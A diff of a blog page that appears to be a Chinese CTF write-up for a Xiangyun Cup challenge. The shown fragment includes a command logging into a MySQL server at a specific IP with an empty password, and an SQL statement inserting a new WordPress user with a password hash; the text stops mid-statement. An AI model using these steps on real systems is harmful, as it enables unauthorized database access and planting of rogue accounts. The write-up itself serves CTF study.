@@ -98,8 +98,7 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>一直在打祥云杯。。赛后来复现下<br>
-CTF做多了。看到题连渗透最基础的端口扫描都忘了。。。。。</p>
-<p>首先端口扫描。发现8000是wordpress。8500是Mysql<br>
+看wordpress的文章。他里面mysql有条命令是连接8500端口<br>
 <code>mysql -h 42.192.72.11 -P 8500 -uwww-data</code><br>
 空密码进入然后添加wordpress的用户</p>
 <pre><code>insert into wp_users values(&quot;3&quot;,&quot;guoke&quot;,&quot;$P$BBtFr9ZBqq5klH.gVcG.bZlbjWV9gn.&quot;,&quot;guoke&quot;,&quot;guoke@qq.com&quot;,&quot;http://59.110.157.4:8000/wordpress&quot;,&quot;2020-11-13 03:49:26&quot;,&quot;&quot;,0,&quot;guoke&quot;);
